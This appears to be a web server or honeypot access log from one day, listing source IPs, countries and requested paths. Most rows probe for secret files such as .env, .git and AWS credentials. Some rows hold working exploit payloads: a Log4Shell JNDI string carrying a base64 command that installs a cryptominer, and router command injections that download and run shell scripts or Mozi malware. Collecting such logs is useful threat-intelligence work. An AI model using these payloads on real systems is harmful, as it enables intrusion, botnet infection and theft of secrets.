"2025-10-10","80.75.212.83","Germany","HTTP","/t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D/45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==%7D%27%29"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/api/.env"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/backend/.env"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/admin/.env"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/.env.example"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/app_dev.php/_profiler/phpinfo"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/?phpinfo=-1"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/data/.env"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/www/.env"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/developer/.env"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/home/.env"
"2025-10-10","78.153.140.203","United Kingdom","HTTP","/media/.env"
"2025-10-10","87.120.191.84","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-10-10","45.38.44.226","United States","HTTP","/login"
"2025-10-10","17.246.23.7","United States","HTTP","/robots.txt"
"2025-10-10","45.38.44.226","United States","HTTP","/login"
"2025-10-10","45.38.44.226","United States","HTTP","/login"
"2025-10-10","195.178.110.201","Bulgaria","HTTP","/.git/index"
"2025-10-10","87.120.191.37","United States","HTTP","http://ip-api.com/json/"
"2025-10-10","178.128.84.187","Singapore","HTTP","/aaa9"
"2025-10-10","178.128.84.187","Singapore","HTTP","/aab8"
"2025-10-10","45.38.44.226","United States","HTTP","/login"
"2025-10-10","78.153.140.224","United Kingdom","HTTP","/.env"
"2025-10-10","78.153.140.224","United Kingdom","HTTP","/.env.secure"
"2025-10-10","221.159.119.6","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"
"2025-10-10","221.159.119.6","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"
"2025-10-10","176.65.149.30","The Netherlands","HTTP","/login"
"2025-10-10","45.38.44.226","United States","HTTP","/login"
"2025-10-10","88.210.63.67","Ukraine","HTTP","/boaform/admin/formLogin"
"2025-10-10","79.124.58.198","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-10-10","194.127.199.64","Norway","HTTP","/.git/config"
"2025-10-10","194.127.199.64","Norway","HTTP","/.env"
"2025-10-10","194.127.199.64","Norway","HTTP","/.env.production"
"2025-10-10","194.127.199.64","Norway","HTTP","/.aws/credentials"
"2025-10-10","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-10-10","92.60.40.199","The Netherlands","HTTP","/.env"
"2025-10-10","206.168.34.222","United States","HTTP","/favicon.ico"
"2025-10-10","206.168.34.222","United States","HTTP","/favicon.ico"
"2025-10-10","206.168.34.222","United States","HTTP","/wiki"
"2025-10-10","165.154.236.169","Singapore","HTTP","/favicon.ico"
"2025-10-10","165.154.236.169","Singapore","HTTP","/robots.txt"
"2025-10-10","164.90.201.32","The Netherlands","HTTP","/.env"
"2025-10-10","164.90.201.32","The Netherlands","HTTP","/.git/config"
"2025-10-10","42.54.22.171","China","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=rm+-rf+/tmp/*;wget+http://42.54.22.171:53911/Mozi.m+-O+/tmp/netgear;sh+netgear\u0026curpath=/\u0026currentsetting.htm=1"
"2025-10-10","143.244.181.47","United States","HTTP","/admin/config.php"
"2025-10-10","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-10","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-10","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-10","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-10","89.190.159.188","The Netherlands","HTTP","/admin/config.php"
"2025-10-10","144.172.106.140","United States","HTTP","/boaform/admin/formLogin"
"2025-10-10","167.94.146.60","United States","HTTP","/favicon.ico"
"2025-10-10","167.94.146.60","United States","HTTP","/favicon.ico"
"2025-10-10","167.94.146.60","United States","HTTP","/wiki"
"2025-10-10","45.94.31.135","The Netherlands","HTTP","/.env"
"2025-10-10","24.199.100.206","United States","HTTP","/admin/config.php"
"2025-10-10","103.141.137.165","Vietnam","HTTP","/.env"
"2025-10-10","24.199.100.206","United States","HTTP","/robots.txt"
"2025-10-10","176.65.141.86","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-10-10","195.178.110.201","Bulgaria","HTTP","/.git/HEAD"
"2025-10-10","152.42.184.78","Singapore","HTTP","/download/powershell/"
"2025-10-10","152.42.184.78","Singapore","HTTP","/get.php"
